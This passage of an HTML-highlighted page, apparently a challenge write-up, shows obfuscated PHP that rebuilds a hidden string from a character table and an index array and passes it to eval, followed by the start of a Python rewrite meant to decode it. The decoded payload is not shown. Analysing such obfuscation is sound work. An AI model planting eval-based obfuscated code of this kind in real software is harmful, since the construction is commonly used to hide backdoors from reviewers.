#2AA198&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;$do_me&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;count&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$order&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #268BD2&#34;&gt;$do_me&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$do_me&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$terms&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$order&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]];&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;eval&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$do_me&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt; 
&lt;span style=&#34;color: #719e07&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Find an online tool to run this PHP code or re-write it in Python . My Python code:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Code re-written in Python&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;terms&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;M&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Z&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;]&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;f&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;v&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Q&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;+&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;E&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;D&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;g&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;W&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;q&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;y&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;T&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;V&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;X&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;)&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;9&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;P&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;G&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;~&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;O&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;u&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;U&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;@&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;H&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;6&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;L&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;^&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;l&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;$&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;`&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;N&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;[&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;}&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;J&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;-&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;_&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;=&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;{&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;k&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;o&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;7&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Y&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;(&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;j&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: 